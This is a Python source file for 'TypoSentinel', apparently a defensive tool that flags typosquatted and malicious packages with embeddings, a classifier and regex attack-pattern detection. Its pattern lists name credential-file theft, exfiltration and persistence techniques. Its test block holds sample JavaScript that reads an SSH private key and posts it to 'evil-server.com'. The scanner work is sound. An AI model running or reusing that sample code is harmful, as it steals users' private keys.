# TypoSentinel Machine Learning Models Implementation

import torch
import torch.nn as nn
import torch.nn.functional as F
import numpy as np
from typing import List, Dict, Tuple, Optional
from dataclasses import dataclass
import pickle
from transformers import AutoTokenizer, AutoModel
import faiss
from sklearn.ensemble import RandomForestClassifier, IsolationForest
from sklearn.feature_extraction.text import TfidfVectorizer
import joblib
import logging

logger = logging.getLogger(__name__)

@dataclass
class PackageFeatures:
    """Features extracted from a package for ML analysis"""
    name: str
    description: Optional[str]
    author: Optional[str]
    version: str
    downloads: int
    age_days: int
    dependencies: List[str]
    keywords: List[str]
    has_install_script: bool
    script_entropy: float
    maintainer_count: int
    release_frequency: float
    namespace: Optional[str]

class SemanticSimilarityModel:
    """
    Embedding-based model for detecting semantic typosquatting attacks
    that traditional edit distance metrics might miss.
    """
    
    def __init__(self, model_name='sentence-transformers/all-MiniLM-L6-v2'):
        self.tokenizer = AutoTokenizer.from_pretrained(model_name)
        self.model = AutoModel.from_pretrained(model_name)
        self.model.eval()
        
        # FAISS index for efficient similarity search
        self.index = None
        self.package_names = []
        self.embeddings_cache = {}
        
    def encode_package_name(self, name: str) -> np.ndarray:
        """Generate embedding for package name"""
        if name in self.embeddings_cache:
            return self.embeddings_cache[name]
        
        # Preprocess package name
        processed_name = self._preprocess_name(name)
        
        # Tokenize and encode
        inputs = self.tokenizer(
            processed_name, 
            return_tensors='pt', 
            truncation=True, 
            padding=True,
            max_length=128
        )
        
        with torch.no_grad():
            outputs = self.model(**inputs)
            # Mean pooling
            embeddings = outputs.last_hidden_state.mean(dim=1)
            embeddings = F.normalize(embeddings, p=2, dim=1)
        
        embedding = embeddings.cpu().numpy()[0]
        self.embeddings_cache[name] = embedding
        return embedding
    
    def _preprocess_name(self, name: str) -> str:
        """Preprocess package name for better semantic understanding"""
        # Split on common delimiters
        parts = name.replace('-', ' ').replace('_', ' ').replace('.', ' ')
        # Expand common abbreviations
        abbreviations = {
            'js': 'javascript',
            'py': 'python',
            'lib': 'library',
            'util': 'utility',
            'dev': 'development',
            'prod': 'production'
        }
        for abbr, full in abbreviations.items():
            parts = parts.replace(abbr, full)
        return parts.lower()
    
    def build_index(self, package_names: List[str], batch_size: int = 32):
        """Build FAISS index for efficient similarity search"""
        logger.info(f"Building semantic index for {len(package_names)} packages")
        
        embeddings = []
        self.package_names = package_names
        
        # Process in batches for efficiency
        for i in range(0, len(package_names), batch_size):
            batch = package_names[i:i + batch_size]
            batch_embeddings = [self.encode_package_name(name) for name in batch]
            embeddings.extend(batch_embeddings)
        
        embeddings = np.array(embeddings).astype('float32')
        
        # Build FAISS index
        dimension = embeddings.shape[1]
        self.index = faiss.IndexFlatIP(dimension)  # Inner product for cosine similarity
        self.index.add(embeddings)
        
        logger.info("Semantic index built successfully")
    
    def find_similar(self, query_name: str, k: int = 10, 
                    threshold: float = 0.7) -> List[Tuple[str, float]]:
        """Find semantically similar package names"""
        if not self.index:
            raise ValueError("Index not built. Call build_index() first.")
        
        query_embedding = self.encode_package_name(query_name)
        query_embedding = query_embedding.reshape(1, -1).astype('float32')
        
        # Search for similar packages
        scores, indices = self.index.search(query_embedding, k)
        
        results = []
        for score, idx in zip(scores[0], indices[0]):
            if score >= threshold and self.package_names[idx] != query_name:
                results.append((self.package_names[idx], float(score)))
        
        return results
    
    def save(self, path: str):
        """Save model and index"""
        data = {
            'index': faiss.serialize_index(self.index),
            'package_names': self.package_names,
            'embeddings_cache': self.embeddings_cache
        }
        with open(path, 'wb') as f:
            pickle.dump(data, f)
    
    def load(self, path: str):
        """Load model and index"""
        with open(path, 'rb') as f:
            data = pickle.load(f)
        self.index = faiss.deserialize_index(data['index'])
        self.package_names = data['package_names']
        self.embeddings_cache = data['embeddings_cache']


class MaliciousPackageClassifier:
    """
    Multi-modal classifier that combines various signals to detect
    malicious packages beyond just name similarity.
    """
    
    def __init__(self):
        self.rf_classifier = RandomForestClassifier(
            n_estimators=100,
            max_depth=10,
            random_state=42
        )
        self.anomaly_detector = IsolationForest(
            contamination=0.1,
            random_state=42
        )
        self.tfidf_vectorizer = TfidfVectorizer(
            max_features=1000,
            ngram_range=(1, 3)
        )
        self.feature_names = []
        
    def extract_features(self, package: PackageFeatures) -> np.ndarray:
        """Extract numerical features from package metadata"""
        features = []
        
        # Name-based features
        features.append(len(package.name))
        features.append(package.name.count('-'))
        features.append(package.name.count('_'))
        features.append(package.name.count('.'))
        features.append(1 if package.name[0].isdigit() else 0)
        features.append(sum(c.isdigit() for c in package.name))
        
        # Entropy of package name
        name_entropy = self._calculate_entropy(package.name)
        features.append(name_entropy)
        
        # Author features
        if package.author:
            features.append(len(package.author))
            features.append(1 if '@' in package.author else 0)
        else:
            features.extend([0, 0])
        
        # Temporal features
        features.append(np.log1p(package.age_days))
        features.append(np.log1p(package.downloads))
        features.append(package.release_frequency)
        
        # Package complexity
        features.append(len(package.dependencies))
        features.append(len(package.keywords))
        features.append(package.maintainer_count)
        
        # Security indicators
        features.append(1 if package.has_install_script else 0)
        features.append(package.script_entropy)
        
        # Description features
        if package.description:
            features.append(len(package.description))
            desc_entropy = self._calculate_entropy(package.description)
            features.append(desc_entropy)
            
            # Suspicious keyword indicators
            suspicious_keywords = [
                'crypto', 'wallet', 'password', 'token', 
                'secret', 'key', 'steal', 'hack'
            ]
            features.append(
                sum(1 for kw in suspicious_keywords 
                    if kw in package.description.lower())
            )
        else:
            features.extend([0, 0, 0])
        
        # Namespace features
        if package.namespace:
            features.append(1)  # Has namespace
            features.append(len(package.namespace))
        else:
            features.extend([0, 0])
        
        return np.array(features)
    
    def _calculate_entropy(self, text: str) -> float:
        """Calculate Shannon entropy of text"""
        if not text:
            return 0.0
        
        # Count character frequencies
        char_counts = {}
        for char in text:
            char_counts[char] = char_counts.get(char, 0) + 1
        
        # Calculate entropy
        entropy = 0.0
        total_chars = len(text)
        for count in char_counts.values():
            probability = count / total_chars
            if probability > 0:
                entropy -= probability * np.log2(probability)
        
        return entropy
    
    def train(self, training_data: List[Tuple[PackageFeatures, bool]]):
        """Train the classifier on labeled data"""
        logger.info(f"Training classifier on {len(training_data)} samples")
        
        X = []
        y = []
        descriptions = []
        
        for package, is_malicious in training_data:
            features = self.extract_features(package)
            X.append(features)
            y.append(1 if is_malicious else 0)
            descriptions.append(package.description or '')
        
        X = np.array(X)
        y = np.array(y)
        
        # Train TF-IDF on descriptions
        tfidf_features = self.tfidf_vectorizer.fit_transform(descriptions)
        
        # Combine numerical and text features
        X_combined = np.hstack([X, tfidf_features.toarray()])
        
        # Train random forest
        self.rf_classifier.fit(X_combined, y)
        
        # Train anomaly detector on benign samples only
        X_benign = X_combined[y == 0]
        self.anomaly_detector.fit(X_benign)
        
        # Store feature names for interpretability
        self.feature_names = [
            'name_length', 'dash_count', 'underscore_count', 'dot_count',
            'starts_with_digit', 'digit_count', 'name_entropy',
            'author_length', 'has_email', 'log_age_days', 'log_downloads',
            'release_frequency', 'dependency_count', 'keyword_count',
            'maintainer_count', 'has_install_script', 'script_entropy',
            'description_length', 'description_entropy', 'suspicious_keywords',
            'has_namespace', 'namespace_length'
        ] + [f'tfidf_{i}' for i in range(tfidf_features.shape[1])]
        
        logger.info("Classifier training completed")
    
    def predict(self, package: PackageFeatures) -> Dict[str, any]:
        """Predict if a package is malicious"""
        # Extract features
        features = self.extract_features(package)
        
        # Get TF-IDF features
        description = [package.description or '']
        tfidf_features = self.tfidf_vectorizer.transform(description)
        
        # Combine features
        X = np.hstack([features.reshape(1, -1), tfidf_features.toarray()])
        
        # Get predictions
        malicious_prob = self.rf_classifier.predict_proba(X)[0, 1]
        is_anomaly = self.anomaly_detector.predict(X)[0] == -1
        
        # Get feature importance for this prediction
        feature_importance = self._get_feature_importance(X[0])
        
        return {
            'is_malicious': malicious_prob > 0.5,
            'malicious_probability': float(malicious_prob),
            'is_anomaly': bool(is_anomaly),
            'risk_score': float(malicious_prob * 0.7 + (0.3 if is_anomaly else 0)),
            'important_features': feature_importance[:10]  # Top 10 features
        }
    
    def _get_feature_importance(self, features: np.ndarray) -> List[Tuple[str, float]]:
        """Get feature importance for a specific prediction"""
        # Use tree-based feature importance
        importances = self.rf_classifier.feature_importances_
        
        # Calculate contribution of each feature
        contributions = features * importances
        
        # Sort by absolute contribution
        feature_contributions = [
            (self.feature_names[i], float(contributions[i]))
            for i in range(len(self.feature_names))
        ]
        
        return sorted(
            feature_contributions, 
            key=lambda x: abs(x[1]), 
            reverse=True
        )
    
    def save(self, path: str):
        """Save trained model"""
        model_data = {
            'rf_classifier': self.rf_classifier,
            'anomaly_detector': self.anomaly_detector,
            'tfidf_vectorizer': self.tfidf_vectorizer,
            'feature_names': self.feature_names
        }
        joblib.dump(model_data, path)
    
    def load(self, path: str):
        """Load trained model"""
        model_data = joblib.load(path)
        self.rf_classifier = model_data['rf_classifier']
        self.anomaly_detector = model_data['anomaly_detector']
        self.tfidf_vectorizer = model_data['tfidf_vectorizer']
        self.feature_names = model_data['feature_names']


class AttackPatternDetector:
    """
    Detects specific attack patterns in package code and metadata
    using pattern matching and heuristics.
    """
    
    def __init__(self):
        self.patterns = self._load_attack_patterns()
        
    def _load_attack_patterns(self) -> Dict[str, List[Dict]]:
        """Load known attack patterns"""
        return {
            'data_exfiltration': [
                {
                    'name': 'environment_theft',
                    'pattern': r'(process\.env|os\.environ|ENV\[)',
                    'severity': 'high',
                    'description': 'Accessing environment variables'
                },
                {
                    'name': 'file_theft',
                    'pattern': r'(\.ssh|\.aws|\.config|wallet|private|secret)',
                    'severity': 'critical',
                    'description': 'Accessing sensitive files'
                },
                {
                    'name': 'network_exfil',
                    'pattern': r'(fetch|axios|request|http).*?(POST|PUT)',
                    'severity': 'high',
                    'description': 'Sending data over network'
                }
            ],
            'obfuscation': [
                {
                    'name': 'base64_decode',
                    'pattern': r'(atob|base64\.b64decode|Buffer\.from.*base64)',
                    'severity': 'medium',
                    'description': 'Base64 decoding detected'
                },
                {
                    'name': 'eval_usage',
                    'pattern': r'(eval|exec|Function\(|new Function)',
                    'severity': 'high',
                    'description': 'Dynamic code execution'
                },
                {
                    'name': 'hex_decode',
                    'pattern': r'(fromCharCode|\\x[0-9a-fA-F]{2}|\\u[0-9a-fA-F]{4})',
                    'severity': 'medium',
                    'description': 'Hex/Unicode decoding'
                }
            ],
            'persistence': [
                {
                    'name': 'cron_modification',
                    'pattern': r'(crontab|schtasks|at\s+\d|systemctl)',
                    'severity': 'high',
                    'description': 'System scheduler modification'
                },
                {
                    'name': 'startup_modification',
                    'pattern': r'(bashrc|profile|autostart|startup)',
                    'severity': 'high',
                    'description': 'Startup file modification'
                }
            ],
            'cryptomining': [
                {
                    'name': 'mining_pool',
                    'pattern': r'(pool\.minergate|mining.*pool|stratum\+tcp)',
                    'severity': 'critical',
                    'description': 'Cryptocurrency mining pool connection'
                },
                {
                    'name': 'wallet_address',
                    'pattern': r'([13][a-km-zA-HJ-NP-Z1-9]{25,34}|0x[a-fA-F0-9]{40})',
                    'severity': 'high',
                    'description': 'Cryptocurrency wallet address'
                }
            ]
        }
    
    def scan_code(self, code: str) -> List[Dict[str, any]]:
        """Scan code for attack patterns"""
        detections = []
        
        for category, patterns in self.patterns.items():
            for pattern_info in patterns:
                import re
                matches = re.finditer(
                    pattern_info['pattern'], 
                    code, 
                    re.IGNORECASE | re.MULTILINE
                )
                
                for match in matches:
                    detections.append({
                        'category': category,
                        'pattern': pattern_info['name'],
                        'severity': pattern_info['severity'],
                        'description': pattern_info['description'],
                        'match': match.group(),
                        'position': match.span()
                    })
        
        return detections
    
    def calculate_threat_score(self, detections: List[Dict]) -> float:
        """Calculate overall threat score based on detections"""
        if not detections:
            return 0.0
        
        severity_weights = {
            'low': 0.2,
            'medium': 0.5,
            'high': 0.8,
            'critical': 1.0
        }
        
        # Calculate weighted score
        total_weight = sum(
            severity_weights.get(d['severity'], 0.5) 
            for d in detections
        )
        
        # Normalize to 0-1 range with diminishing returns
        threat_score = 1 - np.exp(-total_weight / 3)
        
        return float(threat_score)


class MLPipeline:
    """
    Complete ML pipeline for TypoSentinel that combines all models
    and provides a unified interface for package analysis.
    """
    
    def __init__(self):
        self.semantic_model = SemanticSimilarityModel()
        self.classifier = MaliciousPackageClassifier()
        self.pattern_detector = AttackPatternDetector()
        self.logger = logging.getLogger(__name__)
        
    def analyze_package(self, 
                       package: PackageFeatures, 
                       code_content: Optional[str] = None) -> Dict[str, any]:
        """Comprehensive package analysis using all ML models"""
        results = {
            'package_name': package.name,
            'risk_assessment': {},
            'similar_packages': [],
            'attack_patterns': [],
            'recommendations': []
        }
        
        # Semantic similarity analysis
        try:
            similar = self.semantic_model.find_similar(package.name, k=5)
            results['similar_packages'] = [
                {
                    'name': name,
                    'similarity': score,
                    'risk': 'high' if score > 0.9 else 'medium'
                }
                for name, score in similar
            ]
        except Exception as e:
            self.logger.error(f"Semantic analysis failed: {e}")
        
        # Malicious package classification
        try:
            classification = self.classifier.predict(package)
            results['risk_assessment'] = classification
            
            # Generate risk level
            if classification['risk_score'] > 0.8:
                risk_level = 'critical'
            elif classification['risk_score'] > 0.6:
                risk_level = 'high'
            elif classification['risk_score'] > 0.4:
                risk_level = 'medium'
            else:
                risk_level = 'low'
            
            results['risk_assessment']['risk_level'] = risk_level
        except Exception as e:
            self.logger.error(f"Classification failed: {e}")
        
        # Code pattern detection
        if code_content:
            try:
                patterns = self.pattern_detector.scan_code(code_content)
                results['attack_patterns'] = patterns
                
                # Add pattern-based threat score
                pattern_score = self.pattern_detector.calculate_threat_score(patterns)
                results['risk_assessment']['pattern_threat_score'] = pattern_score
                
                # Update overall risk if patterns found
                if pattern_score > 0.7:
                    results['risk_assessment']['risk_level'] = 'critical'
            except Exception as e:
                self.logger.error(f"Pattern detection failed: {e}")
        
        # Generate recommendations
        results['recommendations'] = self._generate_recommendations(results)
        
        return results
    
    def _generate_recommendations(self, analysis_results: Dict) -> List[str]:
        """Generate actionable recommendations based on analysis"""
        recommendations = []
        
        # Check risk level
        risk_level = analysis_results['risk_assessment'].get('risk_level', 'unknown')
        
        if risk_level in ['critical', 'high']:
            recommendations.append("Block this package immediately")
            recommendations.append("Audit all systems where this package is installed")
            recommendations.append("Review deployment history for potential compromise")
        
        # Check for similar packages
        if analysis_results['similar_packages']:
            top_similar = analysis_results['similar_packages'][0]
            if top_similar['similarity'] > 0.9:
                recommendations.append(
                    f"Consider using '{top_similar['name']}' instead"
                )
        
        # Check for attack patterns
        if analysis_results['attack_patterns']:
            critical_patterns = [
                p for p in analysis_results['attack_patterns'] 
                if p['severity'] == 'critical'
            ]
            if critical_patterns:
                recommendations.append(
                    "Critical security patterns detected - isolate immediately"
                )
        
        # Check if it's an anomaly
        if analysis_results['risk_assessment'].get('is_anomaly'):
            recommendations.append(
                "Package exhibits unusual characteristics - manual review required"
            )
        
        return recommendations
    
    def batch_analyze(self, 
                     packages: List[PackageFeatures], 
                     batch_size: int = 32) -> List[Dict]:
        """Analyze multiple packages efficiently"""
        results = []
        
        for i in range(0, len(packages), batch_size):
            batch = packages[i:i + batch_size]
            batch_results = [
                self.analyze_package(pkg) 
                for pkg in batch
            ]
            results.extend(batch_results)
            
            self.logger.info(
                f"Processed {min(i + batch_size, len(packages))}/{len(packages)} packages"
            )
        
        return results
    
    def update_models(self, new_training_data: List[Tuple[PackageFeatures, bool]]):
        """Update models with new training data"""
        self.logger.info(f"Updating models with {len(new_training_data)} new samples")
        
        # Retrain classifier with combined data
        self.classifier.train(new_training_data)
        
        # Update semantic model index if needed
        new_package_names = [pkg.name for pkg, _ in new_training_data]
        existing_names = self.semantic_model.package_names
        all_names = list(set(existing_names + new_package_names))
        
        if len(all_names) > len(existing_names):
            self.semantic_model.build_index(all_names)
        
        self.logger.info("Model update completed")


# Example usage and testing
if __name__ == "__main__":
    # Configure logging
    logging.basicConfig(level=logging.INFO)
    
    # Create sample package for testing
    test_package = PackageFeatures(
        name="react-scripts-dev",
        description="Development scripts for React applications",
        author="unknown_dev_2023",
        version="1.0.0",
        downloads=150,
        age_days=3,
        dependencies=["react", "webpack"],
        keywords=["react", "development"],
        has_install_script=True,
        script_entropy=4.2,
        maintainer_count=1,
        release_frequency=0.1,
        namespace=None
    )
    
    # Sample malicious code
    test_code = """
    const fs = require('fs');
    const https = require('https');
    
    // Suspicious: Reading SSH keys
    const sshKey = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa');
    
    // Suspicious: Sending data to external server
    https.request({
        hostname: 'evil-server.com',
        method: 'POST',
        path: '/collect'
    }, (res) => {
        // Data exfiltration
    }).write(Buffer.from(sshKey).toString('base64'));
    
    // Suspicious: Using eval
    eval(atob('c29tZV9vYmZ1c2NhdGVkX2NvZGU='));
    """
    
    # Initialize pipeline
    pipeline = MLPipeline()
    
    # Analyze package
    results = pipeline.analyze_package(test_package, test_code)
    
    # Print results
    print(f"Analysis Results for {results['package_name']}:")
    print(f"Risk Level: {results['risk_assessment'].get('risk_level', 'unknown')}")
    print(f"Risk Score: {results['risk_assessment'].get('risk_score', 0):.2f}")
    print(f"\nAttack Patterns Found: {len(results['attack_patterns'])}")
    for pattern in results['attack_patterns']:
        print(f"  - {pattern['description']} ({pattern['severity']})")
    print(f"\nRecommendations:")
    for rec in results['recommendations']:
        print(f"  - {rec}")